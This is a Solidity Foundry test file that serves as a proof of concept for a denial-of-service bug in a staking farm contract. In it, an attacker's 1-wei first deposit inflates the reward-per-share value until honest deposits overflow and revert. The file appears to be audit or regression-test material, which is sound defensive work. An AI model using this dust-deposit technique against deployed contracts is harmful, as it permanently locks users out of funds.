// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {CheeseToken} from "src/CheeseToken.sol";
import {CheeseEmissionController} from "src/CheeseEmissionController.sol";
import {CheeseFarmETH} from "src/farms/CheeseFarmETH.sol";
import {ISqueekCore} from "src/interfaces/ISqueekCore.sol";

contract CoreStubO {
    uint64 public genesis;
    uint64 public settled;
    uint96 public units;
    mapping(uint64 => uint96) public after_;

    constructor(uint64 g) { genesis = g; }
    function settle(uint64 round, uint64 blocks) external {
        units += uint96(blocks) * 1e9;
        for (uint64 r = settled + 1; r <= round; ++r) after_[r] = units;
        settled = round;
    }
    function state() external view returns (ISqueekCore.CoreState memory s) {
        s.settledThroughRound = settled;
        s.cumulativeBlockUnits = units;
        s.blockHeight = uint64(units / 1e9);
    }
    function configuration() external view returns (ISqueekCore.CoreConfiguration memory c) {
        c.genesisTimestamp = genesis;
        c.roundDuration = 600;
        c.blockUnitsPerBlock = 1e9;
    }
    function roundPage(uint64 a, uint64 t, uint256) external view returns (ISqueekCore.RoundPage memory p) {
        require(a <= t && t <= settled, "bounds");
        p.certifiedThroughRound = t;
        p.end.cumulativeBlockUnits = after_[t];
    }
}

/// A 1-wei first deposit makes accRewardPerShare huge (1e36 / 1000 shares per reward wei); afterwards
/// sharesOf * accRewardPerShare overflows for any ordinary deposit, so the farm is permanently unusable.
contract OverflowDoSTest is Test {
    uint64 constant GENESIS = 1_793_735_400;
    address owner = makeAddr("owner");
    address treasury = makeAddr("treasury");
    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");
    CoreStubO core;
    CheeseEmissionController controller;
    CheeseToken cheese;
    CheeseFarmETH farm;

    function setUp() public {
        vm.warp(GENESIS + 100 * 600 + 17);
        core = new CoreStubO(GENESIS);
        controller = new CheeseEmissionController(owner, address(core), treasury);
        cheese = new CheeseToken(owner, treasury, owner, address(controller));
        farm = new CheeseFarmETH(owner, address(controller));
        vm.startPrank(owner);
        controller.bindToken(address(cheese));
        controller.addPool(address(farm), 200); // the ETH Pool
        controller.activate();
        vm.stopPrank();
        core.settle(controller.startRound() - 1, 0);
        controller.checkpoint();
        vm.deal(attacker, 1 ether);
        vm.deal(alice, 100 ether);
    }

    function test_dustFirstDepositBricksFarm() public {
        vm.prank(attacker);
        farm.deposit{value: 1}(); // 1 wei -> 1000 shares
        assertEq(farm.totalShares(), 1000);

        // A day of SqueekCore rounds (144 rounds x 40 blocks, the documented target) while only the dust is staked.
        core.settle(core.settled() + 144, 144 * 40);
        vm.prank(attacker);
        farm.claim(attacker); // pulls the pool's emission: accRewardPerShare += amount * 1e36 / 1000

        // An honest 10 ETH deposit must succeed. It reverts with panic 0x11 (sharesOf * accRewardPerShare overflow).
        vm.prank(alice);
        uint256 shares = farm.deposit{value: 10 ether}();
        assertGt(shares, 0);
        assertEq(farm.sharesOf(alice), shares);
    }
}